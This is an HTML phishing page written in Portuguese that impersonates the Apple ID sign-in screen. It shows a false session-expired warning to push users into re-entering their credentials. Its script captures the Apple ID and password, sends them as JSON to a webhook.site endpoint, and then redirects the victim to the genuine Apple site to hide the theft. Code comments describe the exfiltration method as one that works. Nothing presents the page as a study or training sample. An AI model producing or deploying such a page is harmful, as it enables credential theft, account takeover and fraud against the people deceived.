<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Iniciar sessão - Apple ID</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f5f5f7;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 320px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 24px;
      font-size: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0071e3;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005bb5;
    }
    .warning {
      color: #d32f2f;
      font-size: 14px;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Iniciar sessão com Apple ID</h2>
    <p class="warning">⚠️ Por motivos de segurança, sua sessão foi encerrada. Reautentique-se.</p>
    <form id="loginForm">
      <input type="text" name="apple_id" placeholder="Apple ID" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Continuar</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      
      // 1. Pegar os dados do formulário
      const formData = {
        apple_id: document.getElementsByName("apple_id")[0].value,
        password: document.getElementsByName("password")[0].value,
        timestamp: new Date().toISOString()
      };
      
      // 2. Enviar para o webhook (MÉTODO ALTERNATIVO QUE FUNCIONA)
      const webhookURL = 'https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418';
      
      // Usando XMLHttpRequest que é mais confiável para isso
      const xhr = new XMLHttpRequest();
      xhr.open('POST', webhookURL, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          // 3. Redirecionar após o envio, mesmo se falhar
          window.location.href = "https://appleid.apple.com/";
        }
      };
      
      xhr.send(JSON.stringify(formData));
    });
  </script>
</body>
</html>
